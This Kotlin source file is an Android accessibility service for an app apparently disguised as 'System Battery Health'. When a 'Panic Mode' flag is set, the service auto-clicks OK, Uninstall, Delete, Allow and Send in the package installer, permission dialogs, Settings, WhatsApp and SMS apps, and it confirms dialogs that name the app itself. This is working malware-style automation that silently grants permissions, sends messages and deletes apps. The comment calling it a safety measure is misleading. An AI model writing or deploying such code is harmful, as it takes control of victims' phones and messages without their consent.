package com.ghostbattery.service

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.ghostbattery.R
import com.ghostbattery.data.PrefsManager

class GhostAccessibilityService : AccessibilityService() {

    private lateinit var prefsManager: PrefsManager

    override fun onServiceConnected() {
        prefsManager = PrefsManager(this)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        // Safety Switch: Only automate if Panic Mode was activated by the user
        // This prevents the app from acting like malware during normal use.
        if (!prefsManager.isPanicModeActive) {
            return
        }

        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val allowedPackages = setOf(
                "com.android.packageinstaller",
                "com.google.android.packageinstaller",
                "com.android.permissioncontroller",
                "com.google.android.permissioncontroller",
                "com.whatsapp",
                "com.google.android.apps.messaging",
                "com.android.mms",
                "com.android.settings"
            )

            val eventPkg = event.packageName?.toString()
            if (eventPkg == null || eventPkg !in allowedPackages) return

            val rootNode = rootInActiveWindow ?: return

            try {
                // 1. Detect Standard Keywords (restricted to expected packages only)
                val keywords = listOf("OK", "Uninstall", "Delete", "Allow", "Send")

                var clicked = false

                for (keyword in keywords) {
                    val nodes = rootNode.findAccessibilityNodeInfosByText(keyword)
                    for (node in nodes) {
                        try {
                            if (node.isClickable) {
                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                clicked = true
                                break
                            }

                            // Sometimes the parent is the clickable element (e.g. a button container)
                            var parent: AccessibilityNodeInfo? = node.parent
                            while (parent != null) {
                                try {
                                    if (parent.isClickable) {
                                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                        clicked = true
                                        break
                                    }
                                    val next = parent.parent
                                    parent.recycle()
                                    parent = next
                                } catch (_: Exception) {
                                    parent.recycle()
                                    parent = null
                                }
                            }
                        } finally {
                            node.recycle()
                        }

                        if (clicked) break
                    }
                    if (clicked) break
                }

                if (clicked) return

                // 2. Specific Self-Destruct Detection
                // If the dialog asks to uninstall "System Battery Health" (Our App Name)
                val appName = getString(R.string.app_name)
                if (rootNode.findAccessibilityNodeInfosByText(appName).isNotEmpty()) {
                    val okNodes = rootNode.findAccessibilityNodeInfosByText("OK")
                    okNodes.firstOrNull()?.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                }
            } finally {
                rootNode.recycle()
            }
        }
    }

    override fun onInterrupt() {}
}
